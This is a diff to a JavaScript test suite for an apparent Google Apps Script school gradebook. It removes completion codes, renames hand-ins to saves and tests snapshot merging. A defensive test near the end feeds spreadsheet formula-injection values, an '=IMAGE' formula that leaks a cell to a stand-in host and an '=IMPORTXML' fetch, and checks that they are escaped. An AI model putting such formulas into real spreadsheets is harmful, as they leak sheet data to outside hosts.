@@ -483,7 +483,7 @@ ok &= run('importing twice does not double anybody up', () => {
   if (sh.getLastRow() !== 3) throw new Error('now ' + (sh.getLastRow() - 1) + ' rows');
 });
 
-console.log('— handing in —');
+console.log('— saving —');
 CLIENT_ID = 'CID';
 const hand = (o) => String(doPost({ postData: { contents: JSON.stringify(Object.assign({
   app: 'digestion-lab', name: 'Ana Lee', form: '9A', token: TOK, complete: true,
@@ -494,8 +494,8 @@ const QN = LABS.filter(l => l.id === 'digestion-lab')[0].questions;
 
 const anaRow = () => ss.getSheetByName('Digestion').getRange(2, 1, 1, LAB_COLS.length).getValues()[0];
 
-ok &= run('a hand-in fills the row that was waiting', () => {
-  const out = hand({ score: 90, total: QN, checks: 214, firstTime: 71, code: _code_('digestion-lab', 'Ana Lee', '9A', '90/' + QN) });
+ok &= run('a save fills the row that was waiting', () => {
+  const out = hand({ score: 90, total: QN, checks: 214, firstTime: 71 });
   if (!/^recorded/.test(out)) throw new Error(out);
   const sh = ss.getSheetByName('Digestion');
   if (sh.getLastRow() !== 3) throw new Error('a row was added instead of filled');
@@ -503,8 +503,8 @@ ok &= run('a hand-in fills the row that was waiting', () => {
   if (r[2] !== 90 || r[3] !== QN) throw new Error('score not written: ' + r.slice(2, 5));
   if (Math.abs(r[4] - 90 / QN) > 1e-9) throw new Error('percentage wrong: ' + r[4]);
   if (r[5] !== 'complete') throw new Error('finished flag wrong: ' + r[5]);
-  if (r[9] !== 1) throw new Error('hand-ins should read 1, reads ' + r[9]);
-  if (!(r[10] instanceof Date)) throw new Error('no date on the hand-in');
+  if (r[9] !== 1) throw new Error('saves should read 1, reads ' + r[9]);
+  if (!(r[10] instanceof Date)) throw new Error('no date on the save');
 });
 ok &= run('nobody else was touched', () => {
   const bo = ss.getSheetByName('Digestion').getRange(3, 1, 1, LAB_COLS.length).getValues()[0];
@@ -512,23 +512,23 @@ ok &= run('nobody else was touched', () => {
 });
 ok &= run('a worse second go keeps the better score but still counts', () => {
   const was = anaRow()[10];
-  const out = hand({ score: 40, total: QN, checks: 300, firstTime: 20, code: _code_('digestion-lab', 'Ana Lee', '9A', '40/' + QN) });
+  const out = hand({ score: 40, total: QN, checks: 300, firstTime: 20 });
   const r = anaRow();
   if (r[2] !== 90) throw new Error('a worse run overwrote the best score: ' + r[2]);
   if (r[6] !== 214) throw new Error('the rest of the worse run leaked in');
-  if (r[9] !== 2) throw new Error('hand-ins should read 2, reads ' + r[9]);
+  if (r[9] !== 2) throw new Error('saves should read 2, reads ' + r[9]);
   if (!(r[10] >= was)) throw new Error('the date did not move');
   if (!/higher/.test(out)) throw new Error('should say an earlier one still scores higher: ' + out);
 });
 ok &= run('a better go replaces it', () => {
-  hand({ score: QN, total: QN, checks: 118, firstTime: 99, code: _code_('digestion-lab', 'Ana Lee', '9A', QN + '/' + QN) });
+  hand({ score: QN, total: QN, checks: 118, firstTime: 99 });
   const r = anaRow();
   if (r[2] !== QN || r[6] !== 118 || r[7] !== 99) throw new Error('the better run was not kept: ' + r.slice(2, 8));
-  if (r[9] !== 3) throw new Error('hand-ins should read 3, reads ' + r[9]);
+  if (r[9] !== 3) throw new Error('saves should read 3, reads ' + r[9]);
 });
-ok &= run('handing in part-way through says so', () => {
+ok &= run('a save part-way through says so', () => {
   TOKEN_EMAIL = 'bo@x.kr';
-  hand({ name: 'Bo Kim', score: 20, total: 40, complete: false, code: _code_('digestion-lab', 'Bo Kim', '9A', '20/40') });
+  hand({ name: 'Bo Kim', score: 20, total: 40, complete: false });
   TOKEN_EMAIL = 'ana@x.kr';
   const bo = ss.getSheetByName('Digestion').getRange(3, 1, 1, LAB_COLS.length).getValues()[0];
   if (bo[5] !== 'progress') throw new Error('not marked as in progress: ' + bo[5]);
@@ -537,11 +537,29 @@ ok &= run('handing in part-way through says so', () => {
 ok &= run('a student who joined after the import gets a row', () => {
   _upsertStudents_([{ name: 'Chae Won', email: 'chae@x.kr', userId: 'u3' }], '9A', 'Y9 Biology', 'c1');
   TOKEN_EMAIL = 'chae@x.kr';
-  hand({ name: 'Chae Won', score: 50, total: QN, code: _code_('digestion-lab', 'Chae Won', '9A', '50/' + QN) });
+  hand({ name: 'Chae Won', score: 50, total: QN });
   TOKEN_EMAIL = 'ana@x.kr';
   const sh = ss.getSheetByName('Digestion');
   if (sh.getLastRow() !== 4) throw new Error('rows: ' + (sh.getLastRow() - 1));
   if (sh.getRange(4, 1).getValue() !== 'Chae Won') throw new Error('not the new student');
+});
+
+ok &= run('a save from a device that knows less cannot take a right answer away', () => {
+  TOKEN_EMAIL = 'bo@x.kr';
+  hand({ name: 'Bo Kim', score: 6, total: QN, complete: false, snap: 'mouth~a1:ff11|villus~b2:1t00' });
+  hand({ name: 'Bo Kim', score: 3, total: QN, complete: false, snap: 'mouth~a1:0f10|villus~b2:0000|liver~c3:f' });
+  TOKEN_EMAIL = 'ana@x.kr';
+  const bo = ss.getSheetByName('Digestion').getRange(3, 1, 1, LAB_COLS.length).getValues()[0];
+  if (bo[LAB_SNAP - 1] !== 'mouth~a1:ff11|villus~b2:1t00|liver~c3:f') throw new Error('snapshot not merged: ' + bo[LAB_SNAP - 1]);
+  if (bo[2] !== 20) throw new Error('the best score did not stand: ' + bo[2]);
+  if (_mergeSnap_('mouth~a1:ff11', 'mouth~ZZ:0000') !== 'mouth~ZZ:0000') throw new Error('a rewritten station should come from the newer snapshot');
+});
+ok &= run('nothing about completion codes is left', () => {
+  if (typeof _code_ !== 'undefined' || typeof checkCode_ !== 'undefined') throw new Error('the code functions are still there');
+  if (LAB_COLS[9].h !== 'Saves' || LAB_COLS[10].h !== 'Last saved') throw new Error('columns still say hand-in: ' + LAB_COLS[9].h + ', ' + LAB_COLS[10].h);
+  if (!LAB_COLS[11].hide) throw new Error('the old Code column should be hidden');
+  const cells = ss.getSheetByName('Setup').getRange(1, 1, 30, 2).getValues().flat().map(String);
+  if (cells.some(v => /completion code/i.test(v))) throw new Error('the Setup tab still offers to check a code');
 });
 
 console.log('— who is turned away —');
@@ -549,7 +567,7 @@ ok &= run('somebody not on the roster leaves no trace', () => {
   TOKEN_EMAIL = 'stranger@elsewhere.com';
   const before = ss.getSheetByName('Digestion').getLastRow();
   const rejBefore = ss.getSheetByName('Rejected') ? ss.getSheetByName('Rejected').getLastRow() : 0;
-  const out = hand({ name: 'A Stranger', score: QN, total: QN, code: _code_('digestion-lab', 'A Stranger', '9A', QN + '/' + QN) });
+  const out = hand({ name: 'A Stranger', score: QN, total: QN });
   TOKEN_EMAIL = 'ana@x.kr';
   if (!/not on this class list/.test(out)) throw new Error('should have been turned away: ' + out);
   if (ss.getSheetByName('Digestion').getLastRow() !== before) throw new Error('a stranger was recorded');
@@ -567,7 +585,7 @@ ok &= run('an unsigned hand-in leaves no trace', () => {
 ok &= run('a student with a broken code is quarantined, not marked', () => {
   const rej = ss.getSheetByName('Rejected') ? ss.getSheetByName('Rejected').getLastRow() : 0;
   const best = anaRow()[2];
-  hand({ score: 999, total: QN, code: 'DL-XX-YY' });
+  hand({ score: 999, total: QN });
   if (ss.getSheetByName('Rejected').getLastRow() <= rej) throw new Error('not quarantined');
   if (anaRow()[2] !== best) throw new Error('a rejected hand-in still changed the mark');
 });
@@ -576,85 +594,8 @@ ok &= run('a hand-in for a lab that does not exist is ignored', () => {
   if (!/unknown lab/.test(out)) throw new Error(out);
 });
 
-console.log('— reading a completion code —');
+console.log('— the Setup tab buttons —');
 const setupSheet = () => ss.getSheetByName('Setup');
-const askAbout = (code) => {
-  setupSheet().getRange(CODE_ROW, 2).setValue(code);
-  checkCode_();
-  return String(setupSheet().getRange(CODE_ROW + 1, 2).getValue());
-};
-ok &= run("a student's own code resolves to their name and score", () => {
-  const answer = askAbout(_code_('digestion-lab', 'Ana Lee', '', QN + '/' + QN));
-  if (!/Ana Lee/.test(answer)) throw new Error('did not name her: ' + answer);
-  if (!new RegExp(QN + '\\/' + QN).test(answer)) throw new Error('did not give the score: ' + answer);
-  if (!/finished/.test(answer)) throw new Error('did not say it was complete: ' + answer);
-});
-ok &= run('a part-way code resolves too, and says so', () => {
-  const answer = askAbout(_code_('digestion-lab', 'Bo Kim', '9A', '20/' + QN));
-  if (!/Bo Kim/.test(answer) || !new RegExp('20\\/' + QN).test(answer)) throw new Error(answer);
-  if (!/part way/.test(answer)) throw new Error('should say part way: ' + answer);
-});
-ok &= run('it says whether the hand-in actually arrived', () => {
-  const answer = askAbout(_code_('digestion-lab', 'Ana Lee', '', QN + '/' + QN));
-  if (!/Already in the Digestion tab/.test(answer)) throw new Error(answer);
-});
-ok &= run("a stranger's code cannot be read, and it says why", () => {
-  const answer = askAbout(_code_('digestion-lab', 'Someone In Peru', '', QN + '/' + QN));
-  if (!/Could not read that code/.test(answer)) throw new Error(answer);
-});
-ok &= run('an invented code is refused', () => {
-  if (!/Could not read that code/.test(askAbout('DL-AAAA-AAAA'))) throw new Error('accepted a made-up code');
-});
-ok &= run('nonsense in the cell asks for a code rather than failing', () => {
-  if (!/Paste a completion code/.test(askAbout('hello'))) throw new Error('should have asked for a code');
-});
-ok &= run('a code already in a lab tab is looked up, not guessed at', () => {
-  /* the exact case Daniel hit: the Students tab says "Daniel", Google said "Daniel Mompel
-     Riera", so the code can never be reconstructed from the roster name — but it is sitting
-     in the Code column of his row, and that is where it is found. */
-  const sh = ss.getSheetByName('Digestion');
-  const code = _code_('digestion-lab', 'Ana Lee Full Name From Google', '', QN + '/' + QN);
-  sh.getRange(2, 12).setValue(code);
-  const answer = askAbout(code);
-  if (!/Ana Lee/.test(answer)) throw new Error('did not find the row it is written on: ' + answer);
-  if (!/Already in the Digestion tab, row 2/.test(answer)) throw new Error(answer);
-});
-ok &= run('a Google name seen on a hand-in is remembered and tried', () => {
-  const sh = ss.getSheetByName('Digestion');
-  sh.getRange(3, LAB_GNAME).setValue('Bo Kim As Google Spells It');
-  sh.getRange(3, 12).setValue('');                       /* so it cannot just be looked up */
-  const answer = askAbout(_code_('digestion-lab', 'Bo Kim As Google Spells It', '', '77/' + QN));
-  if (!/Bo Kim As Google Spells It/.test(answer)) throw new Error(answer);
-  if (!new RegExp('77\\/' + QN).test(answer)) throw new Error(answer);
-});
-ok &= run('clearing the code clears the answer under it', () => {
-  const sh = setupSheet();
-  askAbout(_code_('digestion-lab', 'Ana Lee', '', QN + '/' + QN));
-  if (!String(sh.getRange(CODE_ROW + 1, 2).getValue())) throw new Error('no answer to clear');
-  sh.getRange(CODE_ROW, 2).setValue('');                       /* he deletes the code */
-  onButtonTicked({ range: sh.getRange(CODE_ROW, 2) });
-  const left = String(sh.getRange(CODE_ROW + 1, 2).getValue());
-  if (left) throw new Error('the old answer is still sitting there: ' + left);
-});
-ok &= run('typing a new code replaces the old answer with a prompt', () => {
-  const sh = setupSheet();
-  askAbout(_code_('digestion-lab', 'Ana Lee', '', QN + '/' + QN));
-  sh.getRange(CODE_ROW, 2).setValue('DL-ZZZZ-ZZZZ');
-  onButtonTicked({ range: sh.getRange(CODE_ROW, 2) });
-  const now = String(sh.getRange(CODE_ROW + 1, 2).getValue());
-  if (/Ana Lee/.test(now)) throw new Error('still showing the answer to the previous code');
-  if (!/Tick the box/.test(now)) throw new Error('no prompt to check it: ' + now);
-});
-ok &= run('editing anything else on Setup is left alone', () => {
-  const sh = setupSheet();
-  askAbout(_code_('digestion-lab', 'Ana Lee', '', QN + '/' + QN));
-  const before = String(sh.getRange(CODE_ROW + 1, 2).getValue());
-  onButtonTicked({ range: sh.getRange(URL_ROW, 2) });          /* he edits the web app URL */
-  if (String(sh.getRange(CODE_ROW + 1, 2).getValue()) !== before) throw new Error('an unrelated edit wiped it');
-});
-ok &= run('the code button is wired to something that exists', () => {
-  onButtonTicked({ range: setupSheet().getRange(BTN_ROW.code, 3) });
-});
 ok &= run('every button leaves a message that stays on the sheet', () => {
   Object.keys(BTN_ROW).forEach(k => {
     const row = BTN_ROW[k];
@@ -845,20 +786,13 @@ ok &= run('a fresh student can be added for the audit', () => {
   if (!rowOf('Digestion', 'zed@x.kr')) throw new Error('no row waiting in Digestion');
 });
 
-/* Each lab's page stamps its own letters on a code: DL- for Digestion, CL- for Classification,
-   and a lab built next term will bring its own. Only the body is ever compared, so every lab
-   here deliberately uses a different prefix, including a three-letter one and none at all.
-   The script used to demand "DL-" and silently refused every Classification hand-in. */
-const PREFIXES = ['DL-', 'CL-', 'BIO-', '', 'X-'];
-
-ok &= run('every lab records a hand-in, whatever letters its codes carry', () => {
+ok &= run('every lab in the register records a save', () => {
   const failed = [];
-  LABS.forEach((lab, i) => {
+  LABS.forEach(lab => {
     const total = lab.questions || 50;
     const score = Math.max(1, Math.floor(total / 3));
-    const code = PREFIXES[i % PREFIXES.length] + _code_(lab.id, 'Zed Audit', '9A', score + '/' + total);
-    const out = hand({ app: lab.id, name: 'Zed Audit', score, total, complete: false, code });
-    if (!/^recorded/.test(out)) { failed.push(lab.name + ' [' + PREFIXES[i % PREFIXES.length] + ']: ' + out); return; }
+    const out = hand({ app: lab.id, name: 'Zed Audit', score, total, complete: false });
+    if (!/^recorded/.test(out)) { failed.push(lab.name + ': ' + out); return; }
     const row = rowOf(lab.name, 'zed@x.kr');
     if (!row) { failed.push(lab.name + ': recorded, but no row carries the address'); return; }
     if (Number(row[2]) !== score || Number(row[3]) !== total) {
@@ -866,30 +800,6 @@ ok &= run('every lab records a hand-in, whatever letters its codes carry', () =>
     }
   });
   if (failed.length) throw new Error(failed.length + ' of ' + LABS.length + ' labs failed:\n   ' + failed.join('\n   '));
-});
-
-ok &= run('a wrong code is still refused, for every lab', () => {
-  const slipped = [];
-  LABS.forEach(lab => {
-    const total = lab.questions || 50;
-    const out = hand({ app: lab.id, name: 'Zed Audit', score: 7, total, complete: false,
-                       code: 'DL-AAAA-AAAA' });
-    if (!/^rejected/.test(out)) slipped.push(lab.name + ': ' + out);
-  });
-  if (slipped.length) throw new Error('accepted a made-up code for: ' + slipped.join(', '));
-});
-
-ok &= run('a hand-in for every lab can be read back from its code', () => {
-  const unreadable = [];
-  LABS.forEach((lab, i) => {
-    if (!lab.questions) return;                 /* a lab with no questions issues no codes to guess at */
-    const total = lab.questions;
-    const score = Math.max(1, Math.floor(total / 3));
-    const code = PREFIXES[i % PREFIXES.length] + _code_(lab.id, 'Zed Audit', '9A', score + '/' + total);
-    const answer = askAbout(code);
-    if (!/Zed Audit/.test(answer)) unreadable.push(lab.name + ': ' + answer.slice(0, 90));
-  });
-  if (unreadable.length) throw new Error(unreadable.join('\n   '));
 });
 
 console.log('— a Students tab that has been knocked about —');
@@ -940,8 +850,7 @@ ok &= run('Tidy up clears repeated columns, keeps ones with data, and cleans add
 ok &= run('a cleaned address still finds the same row — no duplicate is made', () => {
   const dg = ss.getSheetByName('Digestion');
   const before = dg.getLastRow();
-  const out = hand({ app: 'digestion-lab', name: 'Zed Audit', score: QN, total: QN, complete: true,
-                     code: 'DL-' + _code_('digestion-lab', 'Zed Audit', '9A', QN + '/' + QN) });
+  const out = hand({ app: 'digestion-lab', name: 'Zed Audit', score: QN, total: QN, complete: true });
   if (!/^recorded/.test(out)) throw new Error('refused after the address was cleaned: ' + out);
   if (dg.getLastRow() !== before) throw new Error('it made a second row for the same student');
 });
@@ -1027,7 +936,7 @@ ok &= run('somebody removed from Students but holding marks is KEPT and named', 
 
   global.TOKEN_EMAIL = 'gone@x.kr';
   const out = hand({ app: 'digestion-lab', name: 'Left School', score: 12, total: QN,
-                     complete: false, code: 'DL-' + _code_('digestion-lab', 'Left School', '9A', '12/' + QN) });
+                     complete: false });
   if (!/^recorded/.test(out)) throw new Error('could not set the test up: ' + out);
   global.TOKEN_EMAIL = 'zed@x.kr';
 
@@ -1193,12 +1102,13 @@ ok &= run('a token Google does not stand behind is refused, and not asked about 
 });
 ok &= run('nothing a page sends can become a formula in the sheet', () => {
   const was = TOKEN_EMAIL; TOKEN_EMAIL = 'ana@x.kr';          /* an earlier test signed in as somebody else */
-  const code = _code_('digestion-lab', 'Ana Lee', '9A', QN + '/' + QN);
   ss.getSheetByName('Digestion').getRange(2, 3).setValue('');   /* so this hand-in beats her best, and every column is written */
-  hand({ score: QN, total: QN, code: code, snap: '=IMAGE("https://example.invalid/?"&A1)',
+  hand({ score: QN, total: QN, snap: '=IMAGE("https://example.invalid/?"&A1)',
          stations: { '=HYPERLINK("x")': '1/1' } });
   const row = anaRow();
-  if (row[LAB_SNAP - 1] !== '\'=IMAGE("https://example.invalid/?"&A1)') throw new Error('snap stored as ' + row[LAB_SNAP - 1]);
+  /* a snapshot is merged into what the row holds; whatever lands there, it is never a formula */
+  if (/^=/.test(String(row[LAB_SNAP - 1]))) throw new Error('snap stored as a formula: ' + row[LAB_SNAP - 1]);
+  if (_plain_('=IMAGE("https://example.invalid/?"&A1)') !== '\'=IMAGE("https://example.invalid/?"&A1)') throw new Error('a formula-shaped snapshot is not escaped');
   /* a station id that is not an id is now DROPPED rather than merely escaped — the formula never
      reaches the cell at all, which is stronger than the apostrophe. It also stops a station called
      __proto__ reaching the teacher page's roll-up object. */
@@ -1208,7 +1118,7 @@ ok &= run('nothing a page sends can become a formula in the sheet', () => {
     throw new Error('__proto__ was not refused: ' + _stations_({ '__proto__': '1/1', 'mouth': '8/8 in 3' }));
   }
   if (_stations_({ ok: 'x'.repeat(500) }).length > 900) throw new Error('an oversized station string was not capped');
-  hand({ score: 1, total: 1, code: '=IMPORTXML("https://example.invalid","//a")' });
+  hand({ score: 5, total: 1, code: '=IMPORTXML("https://example.invalid","//a")' });   /* refused by its numbers; the code it carries still lands as text */
   const rj = ss.getSheetByName('Rejected');
   const last = rj.getRange(rj.getLastRow(), 1, 1, 9).getValues()[0];
   if (last[6] !== '\'=IMPORTXML("https://example.invalid","//a")') throw new Error('rejected code stored as ' + last[6]);
